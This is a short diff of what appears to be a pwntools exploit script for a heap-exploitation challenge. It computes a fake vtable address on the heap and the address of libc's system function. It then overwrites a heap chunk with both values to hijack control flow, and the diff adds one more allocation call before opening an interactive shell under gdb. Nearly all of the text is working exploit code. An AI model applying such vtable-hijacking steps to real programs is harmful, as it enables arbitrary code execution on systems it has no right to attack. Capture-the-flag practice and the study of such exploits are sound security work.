@@ -64,5 +64,7 @@ vtable = heap_addr + 0x170
 system_addr = libc_addr + libc.sym["system"]
 edit(2,0x100,"\x00"*0x38+p64(vtable) + "b"*0x18 + p64(system_addr))
 
+add(0x80,"a")
+
 gdb.attach(p,"set $h=0x603000")
 p.interactive()
